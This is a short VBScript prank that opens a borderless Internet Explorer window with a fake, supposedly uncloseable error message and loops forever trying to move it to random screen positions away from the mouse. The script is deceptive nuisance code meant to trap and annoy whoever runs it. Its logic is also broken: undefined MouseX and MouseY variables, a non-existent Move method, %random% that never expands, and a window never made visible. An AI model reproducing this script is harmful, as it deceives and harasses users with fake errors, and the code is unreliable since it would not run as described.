Set objShell = WScript.CreateObject("WScript.Shell")
Set objIE = CreateObject("InternetExplorer.Application")

objIE.navigate "about:blank"
objIE.ToolBar = 0
objIE.StatusBar = 0
objIE.Width = 400
objIE.Height = 200
objIE.Left = objShell.ExpandEnvironmentStrings("%random%") Mod (objShell.AppActivate("Untitled") + 1) * 200
objIE.Top = objShell.ExpandEnvironmentStrings("%random%") Mod (objShell.AppActivate("Untitled") + 1) * 200
objIE.Resizable = 0
objIE.MenuBar = 0
objIE.Document.Body.InnerHTML = "<h1>Error</h1><p>This is an error message that cannot be closed.</p>"

Do While True
    If objIE.Left + objIE.Width < MouseX Or objIE.Left > MouseX + 15 Or objIE.Top + objIE.Height < MouseY Or objIE.Top > MouseY + 15 Then
        objIE.Move objShell.ExpandEnvironmentStrings("%random%") Mod (objShell.AppActivate("Untitled") + 1) * 200, objShell.ExpandEnvironmentStrings("%random%") Mod (objShell.AppActivate("Untitled") + 1) * 200
    End If
    WScript.Sleep 100
Loop
